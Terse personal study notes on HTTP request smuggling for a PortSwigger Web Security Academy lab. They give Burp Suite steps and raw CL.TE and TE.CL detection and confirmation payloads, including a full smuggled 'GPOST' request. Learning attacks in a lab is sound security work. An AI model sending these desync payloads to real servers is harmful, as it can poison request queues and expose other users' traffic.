____

HTTP /1
Change request method 

We have to receive HTTP /1 200 OK 

Extension: HTTP Request Smuggler -> Launch all scans

Repeater --> uncheck Update Content-Length 

![[Pasted image 20240815102523.png]]

![[Pasted image 20240815101327.png]]

![[Pasted image 20240815101531.png]]
# CL.TE
Detect

```
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
```

Confirm

```
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

send normal request

# TE.CL

Detect

```
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

Confirm

```
Content-Length: 3
Transfer-Encoding: chunked

1
G
0


```

send normal request

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

56
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0


```


56 --> ![[Pasted image 20240815110132.png]]

CL1 ->  ![[Pasted image 20240815110239.png]]

CL2 -> ![[Pasted image 20240815110330.png]]

5+1 = 6




